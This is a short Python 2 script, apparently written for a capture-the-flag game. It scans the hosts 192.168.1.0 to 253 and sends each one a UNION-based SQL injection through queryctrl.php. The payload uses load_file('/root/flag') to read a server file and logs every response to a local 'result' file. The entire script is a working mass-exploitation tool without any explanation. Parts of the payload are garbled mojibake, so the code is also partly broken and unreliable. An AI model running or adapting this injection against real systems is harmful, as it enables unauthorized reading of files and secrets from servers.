import requests,time

for i in range(254):
	try:
		url=requests.get("http://192.168.1."+str(i)+"/queryctrl.php?username=z%' and 1=2 union select 1,load_file('/root/flag'),区块链式随机,�ļ�����ļ�,5%2",timeout=0.2)
		try:	
			zt=url.text.encode('utf8')
			f=open('result','a+')
			f.write(str(i) + zt + '\n')
			f.close()
			print i,' ', zt
		except:
			print 'refuse:',i
	except:
		print i,'connect down'


